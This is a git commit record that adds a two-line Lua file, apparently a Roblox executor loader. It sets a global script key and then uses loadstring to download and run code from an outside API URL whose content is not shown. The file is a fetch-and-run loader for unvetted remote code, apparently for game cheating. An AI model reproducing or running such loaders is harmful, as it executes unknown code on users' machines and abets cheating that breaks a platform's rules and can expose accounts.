783acd86c3fb46e055982bd45a061dc1c6fa70c6
deproxies <deproxies@gmail.com>
2026-02-23 13:13:29 -0600

    Create Brainrotshit.lua

---
+++ Brainrotshit.lua
@@ -0,0 +1,2 @@
+getgenv().SCRIPT_KEY = "48b8034b-7206-42ef-8f9b-4625f84f91a4"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/2c42440bf39458c8f14d9cca1d2cbc8e2d7fb57cf30d7c6e6459935ece53b742/download"))()
